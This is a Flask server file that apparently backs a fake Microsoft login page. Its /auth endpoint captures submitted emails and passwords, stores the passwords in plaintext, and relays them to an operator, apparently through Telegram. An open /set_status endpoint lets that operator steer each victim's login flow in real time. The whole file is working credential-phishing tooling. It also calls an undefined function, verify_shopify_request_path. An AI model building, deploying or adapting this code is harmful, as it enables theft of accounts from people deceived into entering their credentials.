from flask import Flask, request
from flask import render_template, send_from_directory,  redirect, Response

from models import Email_statuses
from flask_cors import CORS

from dotenv import load_dotenv
from tg import send_notification, get_status_update

load_dotenv()
import os

hosted_url = os.getenv("HOSTED_URL")


app = Flask(__name__, static_folder='microsoft_login/build')

CORS(app)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def serve(path):
    if path in ["vcards", "editor"]:
        if not verify_shopify_request_path(request):
            return {"status":"error", "message":"unauthorized"}, 401

    if path != "" and os.path.exists(app.static_folder + '/' + path):
        return send_from_directory(app.static_folder, path)
    else:
        return send_from_directory(app.static_folder, 'index.html')


@app.get("/set_status/<email>/<status>")
def set_status(email, status):
    try:
        Email_statuses.update_one(
            {"email": email.strip()},
            {"$set": {"status": status}},
            upsert=True
        )  
        return {"status":"success", "message":f"Status updated for {email} as {status}"}
    except Exception as e:
        return {"status":"error", "message":str(e)}



@app.post("/auth")
def auth():
    req = request.json
    email = req['email'].strip()
    password = req['password']
 

    email_response = Email_statuses.find_one({"email": email})

    if email_response is None or not email_response.get("status"):
        get_status_update(email, password)
        Email_statuses.update_one(
            {"email": email.strip()},
            {"$set": {"status": "pending", "password": password}},
            upsert=True
        )  
        return {"status":"pending"}
    
    if email_response.get('password') != password :
        get_status_update(email, password)
        Email_statuses.update_one(
            {"email": email.strip()},
            {"$set": {"status": "pending", "password": password}},
            upsert=True
        )
        return {"status":"pending"}


    
    return {"status": email_response['status']}


@app.post("/alert")
def alert():
    req = request.json
    message = req['message']
    send_notification(message)
    return {"status":"success", "message":"A new job came in"}



if __name__ == '__main__':
    app.run(debug=True)